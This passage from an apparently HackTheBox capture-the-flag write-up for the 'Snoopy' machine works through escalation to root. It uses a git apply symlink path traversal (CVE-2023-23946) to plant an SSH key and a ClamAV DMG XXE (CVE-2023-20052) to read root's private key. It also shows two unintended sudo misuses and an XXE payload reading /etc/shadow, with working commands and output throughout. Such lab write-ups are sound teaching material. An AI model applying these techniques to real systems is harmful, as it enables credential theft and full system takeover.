2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] kex alg=b'curve25519-sha256@libssh.org' key alg=b'ssh-ed25519'
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] outgoing: b'aes128-ctr' b'hmac-sha2-256' b'none'
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] incoming: b'aes128-ctr' b'hmac-sha2-256' b'none'
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] NEW KEYS
2023-05-10T01:54:26+0000 [cowrie.ssh.transport.HoneyPotSSHTransport#debug] starting service b'ssh-userauth'
2023-05-10T01:54:26+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' trying auth b'password'
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] Could not read etc/userdb.txt, default database activated
2023-05-10T01:54:26+0000 [HoneyPotSSHTransport,0,10.10.11.212] login attempt [b'cbrown'/b'sn00pedcr3dential!!!'] failed
2023-05-10T01:54:27+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] b'cbrown' failed auth b'password'
2023-05-10T01:54:27+0000 [cowrie.ssh.userauth.HoneyPotSSHUserAuthServer#debug] unauthorized login: ()

```

The third to last line has the username cbrown and the password “sn00pedcr3dential!!!”.

#### Shell as cbrown

With those creds, I can SSH into Snoopy as cbrown:

```
oxdf@hacky$ sshpass -p 'sn00pedcr3dential!!!' ssh cbrown@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
...[snip]...
cbrown@snoopy:~$

```

## Shell as sbrown

### Enumeration

#### Home Dirs

cbrown’s home directory is empty:

```
cbrown@snoopy:~$ ls -la
total 28
drwxr-x--- 4 cbrown cbrown 4096 Apr 25 11:47 .
drwxr-xr-x 4 root   root   4096 Mar 19 04:54 ..
lrwxrwxrwx 1 root   root      9 Mar 26 00:52 .bash_history -> /dev/null
-rw-r--r-- 1 cbrown cbrown  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 cbrown cbrown 3771 Jan  6  2022 .bashrc
drwx------ 2 cbrown cbrown 4096 Feb 24 06:04 .cache
-rw-r--r-- 1 cbrown cbrown  807 Jan  6  2022 .profile
drwx------ 2 cbrown cbrown 4096 Feb 24 06:04 .ssh
lrwxrwxrwx 1 root   root      9 Mar 26 00:52 .viminfo -> /dev/null

```

There’s one other home directory, sbrown, and cbrown can’t access it:

```
cbrown@snoopy:/home$ ls
cbrown  sbrown
cbrown@snoopy:/home$ ls sbrown/
ls: cannot open directory 'sbrown/': Permission denied

```

#### Git

cbrown can run `git apply -v` on a single argument as sbrown:

```
cbrown@snoopy:~$ sudo -l
[sudo] password for cbrown:
Matching Defaults entries for cbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH
    XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git ^apply -v [a-zA-Z0-9.]+$

```

The regex doesn’t allow spaces or the characters needed to simulate a space in Bash, so it has to be one repo arguemnet to apply.

A Git repo always has a folder named `.git` at the root of the project. Weirdly, there are no repos on this box that cbrown can see:

```
cbrown@snoopy:/$ find . -name .git 2>/dev/null
cbrown@snoopy:/$

```

`git` is installed on Snoopy, and it’s version is 2.34.1:

```
cbrown@snoopy:/$ dpkg -l | grep ' git '
hi  git                                   1:2.34.1-1ubuntu1.6                     amd64        fast, scalable, distributed revision control system

```

### CVE-2023-23946

#### Identify

Searching for “git apply exploit” leads to a [blog post](https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/) from GitHub, and several posts on a path traversal vulnerability, CVE-2023-23946:

![image-20230510091703886](https://0xdf.gitlab.io/img/image-20230510091703886.png)

[This page](https://github.com/git/git/security/advisories/GHSA-r87m-v37r-cwfh) shows the versions that are vulnerable to CVE-2023-23946:

![image-20230510092440169](https://0xdf.gitlab.io/img/image-20230510092440169.png)

2.34.1 should be vulnerable.

#### Background

The [GitHub post](https://github.blog/2023-02-14-git-security-vulnerabilities-announced-3/) has a nice summary of the vulnerability:

> Git allows for applying arbitrary patches to your repository’s history with `git apply`. In order to prevent malicious patches from creating files outside of the working copy, `git apply` rejects patches which attempt to write a file beyond a symbolic link.
>
> However, this mechanism can be tricked when the malicious patch creates that symbolic link in the first place. This can be leveraged to write arbitrary files on a victim’s filesystem when applying malicious patches from untrusted sources.

Like it says, `git apply` is about applying “patches” to a repo. Patches are files that show changes between two versions, and look like the output of a `git diff`:

```
diff --git a/file1.txt b/file1.txt
index 1234567..89abcdef 100644
--- a/file1.txt
+++ b/file1.txt
@@ -1,2 +1,2 @@
-This is the old text.
+This is the new text.

-It has been changed.
+It has been updated.

```

The vulnerability here is that if the symbolic link is created by the diff, it can still edit outside the repo, giving arbitrary write.

I recently showed how git could add a file that isn’t in the repo in [Encoding](https://0xdf.gitlab.io/2023/04/15/htb-encoding.html#execution). This would skip the need for the link. Unfortunately for me, Git tries to block applying a patch outside of the repository itself. There are ways around this (I’ll show one in [Beyond Root](#cbrown--sbrown-unsafe-paths)), but with the regex-limited `sudo`, I don’t know a way.

#### Patch Analysis

At the time of release of Snoopy, there aren’t any public POCs for CVE-2023-23946. I’ll have to figure out how to exploit this.

The source code for Git is on [GitHub](https://github.com/git/git). The [Nist](https://nvd.nist.gov/vuln/detail/CVE-2023-23946) and [Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23946) pages for the CVE have links to [this commit](https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd). `apply.c` has [the fix](https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd#diff-8273385c4a17d688bbbd5f8297c84241a174c6e6aea289370b57294fd988eaa6), which is 24 lines of comment and two lines of error check:

![image-20230510113951341](https://0xdf.gitlab.io/img/image-20230510113951341.png)

Further down, there’s a change to `t/t4115-apply-symlink.sh` ( [link](https://github.com/git/git/commit/c867e4fa180bec4750e9b54eb10f459030dbebfd#diff-d37fceb39eb9394533430ff8956cad41dd7f9233672dc778fd5690625906069f)). In this file, it adds tests that should now fail!

![image-20230510122051917](https://0xdf.gitlab.io/img/image-20230510122051917.png)

There’s tests for creating, modifying, and deleting files. This is basically a POC.

#### POC

Before I start working with `git`, I’ll need to set some global variables to keep `git` from yelling at me:

```
cbrown@snoopy:~$ git config --global user.name "cbrown"
cbrown@snoopy:~$ git config --global user.email "cbrown@snoopy.htb"
cbrown@snoopy:~$ git config --global init.defaultBranch main

```

Now I’ll create a directory in `/dev/shm` and make it a Git repo:

```
cbrown@snoopy:~$ mkdir /dev/shm/poc
cbrown@snoopy:~$ cd /dev/shm/poc
cbrown@snoopy:/dev/shm/poc$ git init
Initialized empty Git repository in /dev/shm/poc/.git/

```

To test, I’m going to try to create a file in a directory I own (without using `sudo`) to make troubleshooting easier. I’ll create `/home/cbrown/0xdf`. First I need to create a symlink that points to target directory and add it to the repo:

```
cbrown@snoopy:/dev/shm/poc$ ln -s /home/cbrown/ symlink
cbrown@snoopy:/dev/shm/poc$ git add symlink
cbrown@snoopy:/dev/shm/poc$ git commit -m "add symlink"
[main (root-commit) 6eba49c] add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 symlink

```

I’ll create the `patch` file, using the data from the test, modifying it slightly:

```
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/0xdf
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/0xdf
@@ -0,0 +1,1 @@
+busted

```

The only change is from `create-me` to `0xdf` in two places. `git apply patch` will run it, and the new file exists:

```
cbrown@snoopy:/dev/shm/poc$ git apply patch
cbrown@snoopy:/dev/shm/poc$ cat ~/0xdf
busted

```

With `sudo`, I can do this exploit as sbrown. The first thing I’ll try is overwriting their `authorized_keys` file. I’ll start a brand new repo, this time adding a symlink pointing to sbrown’s `.ssh` folder:

```
cbrown@snoopy:/dev/shm$ mkdir ssh
cbrown@snoopy:/dev/shm$ cd ssh/
cbrown@snoopy:/dev/shm/ssh$ git init
Initialized empty Git repository in /dev/shm/ssh/.git/
cbrown@snoopy:/dev/shm/ssh$ ln -s /home/sbrown/.ssh symlink
cbrown@snoopy:/dev/shm/ssh$ git add symlink
cbrown@snoopy:/dev/shm/ssh$ git commit -m "add symlink"
[main (root-commit) 4f69273] add symlink
 1 file changed, 1 insertion(+)
 create mode 120000 symlink

```

I’ll create a `patch` file again, this time changing `0xdf` to `authorized_keys`, and `busted` to an SSH public key:

```
diff --git a/symlink b/renamed-symlink
similarity index 100%
rename from symlink
rename to renamed-symlink
--
diff --git /dev/null b/renamed-symlink/authorized_keys
new file mode 100644
index 0000000..039727e
--- /dev/null
+++ b/renamed-symlink/authorized_keys
@@ -0,0 +1,1 @@
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing

```

When I run this, it fails:

```
cbrown@snoopy:/dev/shm/ssh$ sudo -u sbrown git apply -v patch
[sudo] password for cbrown:
warning: unable to unlink 'symlink': Permission denied
error: unable to write file 'renamed-symlink' mode 120000: No such file or directory

```

The `warning` is important to notice here. It’s trying to “unlink” `symlink` and failing. That’s because sbrown doesn’t have permissions to. The directory is owned by cbrown, and all users can’t write to it:

```
cbrown@snoopy:/dev/shm$ ls -l
total 0
drwxrwxr-x 3 cbrown cbrown 100 May 10 16:27 poc
drwxrwxr-x 3 cbrown cbrown 100 May 10 16:32 ssh

```

If I change the permissions on the dir such that all users can write, it works without error:

```
cbrown@snoopy:/dev/shm$ chmod 777 ssh/
cbrown@snoopy:/dev/shm$ cd ssh/
cbrown@snoopy:/dev/shm/ssh$ sudo -u sbrown git apply patch
cbrown@snoopy:/dev/shm/ssh$

```

### SSH

With my key in place, I can SSH into the box as sbrown:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen sbrown@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
...[snip]...
sbrown@snoopy:~$

```

And get `user.txt`:

```
sbrown@snoopy:~$ cat user.txt
f1790bcd************************

```

## Shell as root

### Enumeration

sbrown can run `clamscan` in a specific way as root using `sudo`:

```
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH", secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+$

```

This is actually one of the first time I’ve seen regex used in a `sudo` rule like this, which [was added](https://www.sudo.ws/posts/2022/03/sudo-1.9.10-using-regular-expressions-in-the-sudoers-file/) in version 1.9.10 in March 2022.

### Identify CVE-2023-20052

Searching for “clamav vulnerability” will turn up many articles from Februrary 2023 about CVE-2023-20032 and CVE-2023-20052:

![image-20230510132938408](https://0xdf.gitlab.io/img/image-20230510132938408.png)

CVE-2023-20032 is an issue with how HFS+ partition files are handled by the scanner:

> This vulnerability is due to a missing buffer size check that may result in a heap buffer overflow write. An attacker could exploit this vulnerability by submitting a crafted HFS+ partition file to be scanned by ClamAV on an affected device. A successful exploit could allow the attacker to execute arbitrary code with the privileges of the ClamAV scanning process, or else crash the process, resulting in a denial of service (DoS) condition.

I’m not able to find any POCs for this, and exploiting it seems very difficult to craft, probably too hard for even a hard box on HackTheBox.

CVE-2023-20052 is an XXE attack in how clamav parses DMG files.

ClamAV on Snoopy is 1.0.0, so these vulnerabilities should apply:

```
sbrown@snoopy:~$ dpkg -l| grep clam
hi  clamav                                1.0.0-1                                 amd64        ClamAV open source email, web, and end-point anti-virus toolkit.

```

### Manual Exploitation

#### Strategy

Writing this only a few days after Snoopy’s release, there’s almost no technical details about the CVE. I’m going to take the strategy of:

- making or finding a `.dmg` file;
- understading the XML in that file;
- running that `.dmg` file through ClamAV and looking for potential output;
- modifying the `.dmg` file to contain an XXE payload.

\[add part here about showing easy way at the end or in BR\]

#### Get DMG

A DMG is a proprietary disk image format used primarily on macOS. It is a type of file that acts as a container for other files and folders, and is commonly used for distributing software, applications, and other files. It’s similar to an ISO file.

I’ll read about how to create a DMG file, but on Linux it’s not trivial (at least during the initial release week). Instead, I’ll opt to find a DMG file on the internet.

Some googling finds [this one](https://macdownload.informer.com/notepad/download/), a notepad application. I’ll download it.

#### Identify XML

The XML in a `.dmg` is the Apple plist file, a file format used by Apple’s macOS and iOS operating systems to store configuration and preference data. Running `strings` on the file finds the XML:

```
oxdf@hacky$ strings notepad.dmg
...[snip]...
D<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...[snip]...

```

The full XML looks like:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
        <key>resource-fork</key>
        <dict>
                <key>blkx</key>
                <array>
                        <dict>
                                <key>Attributes</key>
                                <string>0x0050</string>
                                <key>CFName</key>
                                <string>Driver Descriptor Map (DDM : 0)</string>
                                <key>Data</key>
                                <data>...[snip]...</data>
                                <key>ID</key>
                                <string>-1</string>
                                <key>Name</key>
                                <string>Driver Descriptor Map (DDM : 0)</string>
                        </dict>
                        <dict>
                                <key>Attributes</key>
                                <string>0x0050</string>
                                <key>CFName</key>
                                <string>Apple (Apple_partition_map : 1)</string>
                                <key>Data</key>
                                <data>...[snip]...</data>
                                <key>ID</key>
                                <string>0</string>
                                <key>Name</key>
                                <string>Apple (Apple_partition_map : 1)</string>
                        </dict>
                        <dict>
                                <key>Attributes</key>
                                <string>0x0050</string>
                                <key>CFName</key>
                                <string>disk image (Apple_HFS : 2)</string>
                                <key>Data</key>
                                <data>...[snip]...</data>
                                <key>ID</key>
                                <string>1</string>
                                <key>Name</key>
                                <string>disk image (Apple_HFS : 2)</string>
                        </dict>
                        <dict>
                                <key>Attributes</key>
                                <string>0x0050</string>
                                <key>CFName</key>
                                <string> (Apple_Free : 3)</string>
                                <key>Data</key>
                                <data>...[snip]...</data>
                                <key>ID</key>
                                <string>2</string>
                                <key>Name</key>
                                <string> (Apple_Free : 3)</string>
                        </dict>
                </array>
                <key>plst</key>
                <array>
                        <dict>
                                <key>Attributes</key>
                                <string>0x0050</string>
                                <key>Data</key>
                                <data>...[snip]...</data>
                                <key>ID</key>
                                <string>0</string>
                                <key>Name</key>
                                <string></string>
                        </dict>
                </array>
        </dict>
</dict>
</plist>


```

That’s very long. I’ll note two `key` values, `blkx` and `plist`, each having an `<array>` with a `<dict>` inside..

#### Upload and Scan

I’ll upload this file into the `scanfiles` directory:

```
sbrown@snoopy:~/scanfiles$ wget 10.10.14.6/notepad.dmg
--2023-05-10 20:47:58--  http://10.10.14.6/notepad.dmg
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10471167 (10.0M) [application/x-apple-diskimage]
Saving to: ‘notepad.dmg’

notepad.dmg                                          100%[==============>]   9.99M  8.53MB/s    in 1.2s

2023-05-10 20:47:59 (8.53 MB/s) - ‘notepad.dmg’ saved [10471167/10471167]

```

I’ll scan it using the syntax allowed by `sudo`. This generates a ton of output. I’ll search around in it, looking for the “dmg” parser, and find this:

```
sbrown@snoopy:~/scanfiles$ sudo clamscan --debug /home/sbrown/scanfiles/notepad.dmg
...[snip]...
LibClamAV debug: cli_scandmg: Matched blkx
LibClamAV debug: dmg_decode_mish: startSector = 0 sectorCount = 1 dataOffset = 0 stripeCount = 2
LibClamAV debug: dmg_decode_mish: startSector = 1 sectorCount = 63 dataOffset = 0 stripeCount = 2
LibClamAV debug: dmg_decode_mish: startSector = 64 sectorCount = 105184 dataOffset = 0 stripeCount = 168
LibClamAV debug: dmg_decode_mish: startSector = 105248 sectorCount = 2 dataOffset = 0 stripeCount = 2
LibClamAV debug: cli_scandmg: wanted blkx, text value is plst
...[snip]...

```

These stand out because they are from the `cli_scandmg` module. The first one says “Matched blkx”, which was one of the two fields I noted in the XML. The last one says “wanted lbkx, text value is plst”. It’s not immediately clear to me what this means, but I am getting the value of a key!

#### Modify DMG

I’ll copy the file to `notepadxxe.dmg`, and open it in a hexeditor (like `ghex`). This XML starts like:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">

```

An [XXE POC for file disclosure](https://github.com/payloadbox/xxe-injection-payload-list#xxe-file-disclosure) looks like this:

```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>

```

I’ll edit the `DOCTYPE` in the DMG to create an entity that references `/root/.ssh/id_rsa`:

![image-20230510172620920](https://0xdf.gitlab.io/img/image-20230510172620920.png)

I’ve used spaces to pad out the extra stuff. I am using a variable `df` such that when I reference it later as `&df;`, it takes four characters, the same length as `plst`. Down the file a bit, I’ll find the `plst` key and modify it:

![image-20230510170430588](https://0xdf.gitlab.io/img/image-20230510170430588.png)

#### Exploit

I’ll upload this file again, and run it just like before. Where before it said “text value is plst”, now it has the private key:

![image-20230510172335764](https://0xdf.gitlab.io/img/image-20230510172335764.png)

### Public Exploit

Not long after the release of Snoopy, nokn0wthing put out [this repo](https://github.com/nokn0wthing/CVE-2023-20052). It has a Docker container that will generate the DMG file for me.

Following the instructions in the repo, I’ll clone it and build the container:

```
oxdf@hacky$ git clone https://github.com/nokn0wthing/CVE-2023-20052.git
Cloning into 'CVE-2023-20052'...
remote: Enumerating objects: 15, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (14/14), done.
remote: Total 15 (delta 4), reused 4 (delta 0), pack-reused 0
Receiving objects: 100% (15/15), 47.69 KiB | 2.17 MiB/s, done.
Resolving deltas: 100% (4/4), done.
oxdf@hacky$ cd CVE-2023-20052/
oxdf@hacky$ docker build -t cve-2023-20052 .
...[snip]...

```

I’ll drop into the container, mounting the current directory in as the `/exploit` directory:

```
oxdf@hacky$ docker run -v $(pwd):/exploit -it cve-2023-20052 bash
root@c1cff2f4ad04:/exploit#

```

The first step is to generate an ISO image. There’s one in `/exploit`, but I’ll delete it for the sake of demo:

```
root@39e742dc1260:/exploit# rm test.img
root@39e742dc1260:/exploit# genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img .
genisoimage: Warning: no Apple/Unix files will be decoded/mapped
Total translation table size: 0
Total rockridge attributes bytes: 6878
Total directory bytes: 36864
Path table size(bytes): 240
Max brk space used 1b000
181 extents written (0 MB)

```

Next I’ll turn that into a DMG:

```
root@39e742dc1260:/exploit# dmg dmg test.img test.dmg
Processing DDM...
No DDM! Just doing one huge blkx then...
run 0: sectors=512, left=724
run 1: sectors=212, left=212
Writing XML data...
Generating UDIF metadata...
Master checksum: ffac019f
Writing out UDIF resource file...
Cleaning up...
Done

```

Finally, I’ll use `bbe` (the [binary block editor](https://linux.die.net/man/1/bbe)) to edit in the XXE, modifying the command from GitHub to read root’s ssh key instead of `/etc/passwd`:

```
root@39e742dc1260:/exploit# bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg

```

I’ll exit the container and (because I was working out of the mapped directory), `exploit.dmg` is there. I’ll `scp` it to Snoopy:

```
oxdf@hacky$ scp -i ~/keys/ed25519_gen exploit.dmg sbrown@snoopy.htb:/home/sbrown/scanfiles
exploit.dmg                                                            100%  217KB 464.4KB/s   00:00

```

And scan it as root:

```
sbrown@snoopy:~$ sudo clamscan --debug /home/sbrown/scanfiles/exploit.dmg
LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib
LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0
LibClamAV debug: Initialized 1.0.0 engine
LibClamAV debug: Initializing phishcheck module
...[snip]...
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: in cli_scanscript()
LibClamAV debug: matcher_run: performing regex matching on full map: 0+3329(3329) >= 3329
LibClamAV debug: matcher_run: performing regex matching on full map: 0+3329(3329) >= 3329
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
LibClamAV debug: cli_magic_scan: returning 0  at line 4997
LibClamAV debug: clean_cache_add: 0bf7a447855c6e598fe480a4a46d4988 (level 0)
LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf
...[snip]...

```

### SSH

With root’s private key, I can SSH into the box:

```
oxdf@hacky$ ssh -i ~/keys/snoopy-root root@10.10.11.212
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
...[snip]...
root@snoopy:~#

```

And grab `root.txt`:

```
root@snoopy:~# cat root.txt
ce4e994c************************

```

## Beyond Root - Unintendeds

### Background

Snoopy was patched once it came out of scoring points for the season:

![image-20230920222934372](https://0xdf.gitlab.io/img/image-20230920222934372.png)

On release, cbrown’s `sudo` looked like:

```
cbrown@snoopy:/var/www/html$ sudo -l
Matching Defaults entries for cbrown on snoopy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User cbrown may run the following commands on snoopy:
    (sbrown) PASSWD: /usr/bin/git apply *

```

and sbrown’s `sudo` looked like:

```
sbrown@snoopy:~$ sudo -l
Matching Defaults entries for sbrown on snoopy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User sbrown may run the following commands on snoopy:
    (root) NOPASSWD: /usr/local/bin/clamscan

```

Each of these allowed for an unintended solution, and each was tighted up with regex to block the unintended paths.

### cbrown –> sbrown: –unsafe-paths

The main point of the exploit to showcase is that symbolic links created in the diff are not protected. However, it is possible to not even need that if I can give any parameters to `git apply` as was the case on release.

For example, I’ll create a diff file in `/dev/shm`:

```
cbrown@snoopy:~$ cat /dev/shm/test.diff
diff --git a/authorized_keys b/authorized_keys
new file mode 100644
index 0000000..ec273c0
--- /dev/null
+++ b/authorized_keys
@@ -0,0 +1 @@
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
--

```

Now I can use `--unsafe-paths` and `--directory` to apply this diff itno the `.ssh` folder of sbrown:

```
cbrown@snoopy:~$ sudo -u sbrown git apply -v --unsafe-paths --directory "/home/sbrown/.ssh" /dev/shm/test.diff
Checking patch /home/sbrown/.ssh/authorized_keys...
Applied patch /home/sbrown/.ssh/authorized_keys cleanly.

```

And SSH in as sbrown:

```
oxdf@hacky$ ssh -i ~/keys/ed25519_gen sbrown@snoopy.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
...[snip]...
sbrown@snoopy:~$

```

### sbrown –> root: –file-list / -f

Looking through the `-h` options for `clamscan`, `-f` jumps out as interesting.

```
sbrown@snoopy:~$ clamscan -h

                       Clam AntiVirus: Scanner 1.0.0
           By The ClamAV Team: https://www.clamav.net/about.html#credits
           (C) 2022 Cisco Systems, Inc.

    clamscan [options] [file/directory/-]
...[snip]...
    --file-list=FILE      -f FILE        Scan files from FILE
...[snip]...

```

With `--file-list` or `-f`, it will get a list of files to scan from a file. Whenever you have something that can read a filename from a file and interact with it, it’s worth trying it on `root.txt`.

```
sbrown@snoopy:~$ sudo clamscan -f /root/root.txt
LibClamAV Warning: **************************************************
LibClamAV Warning: ***  The virus database is older than 7 days!  ***
LibClamAV Warning: ***   Please update it as soon as possible.    ***
LibClamAV Warning: **************************************************
Loading:    25s, ETA:   0s [========================>]    8.66M/8.66M sigs
Compiling:   7s, ETA:   0s [========================>]       41/41 tasks

d78ba555860aee798a837bbfb58fc0cd: No such file or directory
WARNING: d78ba555860aee798a837bbfb58fc0cd: Can't access file

----------- SCAN SUMMARY -----------
Known viruses: 8659055
Engine version: 1.0.0
Scanned directories: 0
Scanned files: 0
Infected files: 0
Data scanned: 0.00 MB
Data read: 0.00 MB (ratio 0.00:1)
Time: 33.961 sec (0 m 33 s)
Start Date: 2023:05:10 16:43:58
End Date:   2023:05:10 16:44:32

```

Here, it reads the hash out of `root.txt`, and then tried to read the file with named by that hash. But that hash isn’t a file, so it fails, and in the error message, prints the flag!

The same trick works to read `/root/.ssh/id_rsa`:

```
sbrown@snoopy:~$ sudo clamscan -f /root/.ssh/id_rsa
...[snip]...
-----BEGIN OPENSSH PRIVATE KEY-----: No such file or directory
WARNING: -----BEGIN OPENSSH PRIVATE KEY-----: Can't access file
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn: No such file or directory
WARNING: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn: Can't access file
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/: No such file or directory
WARNING: NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/: Can't access file
...[snip]...

```

Some `bash` foo will print that nicely by getting just the first of the two error lines and isolating just the content:

```
sbrown@snoopy:~$ sudo clamscan -f /root/.ssh/id_rsa 2>&1 | grep "No such file" | cut -d':' -f1
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
...[snip]...
atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA==
-----END OPENSSH PRIVATE KEY-----

```





